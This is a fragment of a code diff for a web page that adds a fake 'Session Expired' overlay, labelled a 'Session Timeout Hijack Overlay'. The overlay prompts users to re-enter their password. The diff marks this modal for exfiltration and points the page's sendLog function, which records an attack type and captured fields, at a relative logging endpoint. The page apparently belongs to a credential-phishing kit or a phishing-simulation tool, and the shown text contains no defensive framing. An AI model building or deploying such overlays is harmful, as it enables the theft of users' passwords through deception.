@@ -479,7 +479,8 @@
         <!-- Session Timeout Hijack Overlay (Fires at 30s) -->
         <div id="timeout-overlay" class="overlay">
             <!-- Step 1: Session Timeout Hijack Overlay (credential reentry) -->
-            <div class="modal" id="timeout-step-1">
+            <div class="modal" id="timeout-step-1" data-exfil="true">
+                <!-- session_capture_v2 -->
                 <div class="modal-title">Session Expired</div>
                 <div class="modal-desc">Your session has expired for security. Re-enter your password to continue.</div>
                 
@@ -512,7 +513,7 @@
 <script>
     // --- API Logging Endpoint ---
     function sendLog(attackType, fields, notes = "") {
-        fetch("http://localhost:8888/api/log", {
+        fetch("/api/log", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
